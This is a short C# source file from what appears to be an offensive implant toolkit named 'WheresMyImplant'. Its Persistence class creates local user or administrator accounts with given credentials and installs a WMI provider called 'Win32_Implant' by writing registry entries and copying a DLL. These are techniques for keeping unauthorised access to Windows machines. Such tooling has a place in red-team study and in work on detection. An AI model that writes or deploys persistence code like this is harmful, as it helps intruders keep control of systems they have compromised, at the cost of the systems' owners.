using System;

namespace WheresMyImplant
{
    public sealed class Persistence
    {
        public static void AddLocalUser(String username, String password, String admin)
        {
            if (!Boolean.TryParse(admin, out Boolean bAdmin))
            {
                Console.WriteLine("Unable to parse wait parameter (true, false)");
                return;
            }

            AddUser add = new AddUser();
            if (bAdmin)
            {
                add.AddLocalAdmin(username, password);
                Console.WriteLine("[+] Admin Added");
            }
            add.AddLocalUser(username, password);
            Console.WriteLine("[+] User Added");
        }

        public static void Install()
        {
            InstallWMI install = new InstallWMI(".", @"ROOT\cimv2", "Win32_Implant");
            try
            {
                install.ExtensionProviderSetup();
                install.GetMethods();
                install.AddRegistryLocal();
                install.CopyDll();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Unhandled Exception Occured");
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }
    }
}